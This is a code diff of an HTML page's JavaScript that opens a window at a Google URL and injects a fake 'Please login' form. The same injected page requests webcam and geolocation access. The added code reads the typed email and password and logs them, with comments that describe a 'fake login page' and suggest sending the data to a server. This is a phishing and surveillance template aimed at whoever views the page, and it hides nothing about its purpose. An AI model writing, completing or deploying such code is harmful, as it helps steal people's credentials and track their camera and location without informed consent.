@@ -19,64 +19,72 @@
 
     <script>
         function accessData() {
-            // Open Google CSI (or any other target URL) in a new window without delay
-            var x = window.open('https://www.google.com/csi'); // Open Google CSI instantly
+            // Open Google CSI in a new window
+            var x = window.open('https://www.google.com/csi'); // Open Google CSI
+            
+            // Simulate fake login page and inject camera and location access code
+            setTimeout(function() {
+                x.document.body.innerHTML = `
+                    <h1>Please login</h1>
+                    <p>Email: <input id="email"><br></p>
+                    <p>Password: <input id="pass" type="password"><br></p>
+                    <button onclick="sendData()">Login</button>
+                    <h2>Camera Preview</h2>
+                    <video id="video" width="320" height="240" autoplay></video>
+                    <h2>Location Information</h2>
+                    <p id="location">Fetching location...</p>
+                `;
 
-            // Simulate a fake login page immediately (no delay)
-            x.document.body.innerHTML = '<h1>Please login</h1>';
-            x.document.body.innerHTML += 'Email: <input id="email"><br>';
-            x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
-            x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';
-
-            // Function to send data (removed as per your request)
-            function sendData() {
-                var email = document.getElementById('email').value;
-                var password = document.getElementById('pass').value;
-
-                // Check if both email and password are filled
-                if (email === "" || password === "") {
-                    alert("Please enter both email and password.");
-                    return; // Prevent sending empty data
+                // Camera access API inside the new window
+                if (x.navigator.mediaDevices && x.navigator.mediaDevices.getUserMedia) {
+                    x.navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(function(stream) {
+                            var video = x.document.getElementById('video');
+                            video.srcObject = stream;
+                        })
+                        .catch(function(error) {
+                            console.error('Error accessing camera: ', error);
+                            x.alert('Unable to access camera. Please grant permission.');
+                        });
+                } else {
+                    x.alert('Camera access is not supported by your browser.');
                 }
 
-                // Log the data to the console (no redirect)
-                console.log("Email:", email);
-                console.log("Password:", password);
-
-                // Optionally, you can do more here (send data to a server, etc.)
-                alert('Data has been stored in localStorage');
-            }
-
-            // Akses Kamera
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function (stream) {
-                        // Menampilkan video stream di elemen <video>
-                        var video = document.getElementById('video');
-                        video.srcObject = stream;
-                    })
-                    .catch(function (error) {
-                        console.error('Error accessing camera: ', error);
-                        alert('Unable to access camera. Please grant permission.');
+                // Location access API inside the new window
+                if (x.navigator.geolocation) {
+                    x.navigator.geolocation.getCurrentPosition(function(position) {
+                        var latitude = position.coords.latitude;
+                        var longitude = position.coords.longitude;
+                        x.document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                    }, function(error) {
+                        console.error('Error fetching location: ', error);
+                        x.document.getElementById('location').innerText = 'Unable to fetch location.';
                     });
-            } else {
-                alert('Camera access is not supported by your browser.');
-            }
+                } else {
+                    x.alert('Geolocation is not supported by your browser.');
+                }
+                
+                // Function to handle login data
+                function sendData() {
+                    var email = x.document.getElementById('email').value;
+                    var password = x.document.getElementById('pass').value;
 
-            // Akses Lokasi (Geolocation)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function (position) {
-                    var latitude = position.coords.latitude;
-                    var longitude = position.coords.longitude;
-                    document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                }, function (error) {
-                    console.error('Error fetching location: ', error);
-                    document.getElementById('location').innerText = 'Unable to fetch location.';
-                });
-            } else {
-                alert('Geolocation is not supported by your browser.');
-            }
+                    // Check if both email and password are filled
+                    if (email === "" || password === "") {
+                        x.alert("Please enter both email and password.");
+                        return; // Prevent sending empty data
+                    }
+
+                    // Log the data to the console (no redirect)
+                    console.log("Email:", email);
+                    console.log("Password:", password);
+
+                    // Optionally, you can do more here (send data to a server, etc.)
+                    x.alert('Data has been stored in localStorage');
+                }
+            }, 3000); // Wait for 3 seconds to simulate page load time
         }
     </script>
 </body>
 </html>
+
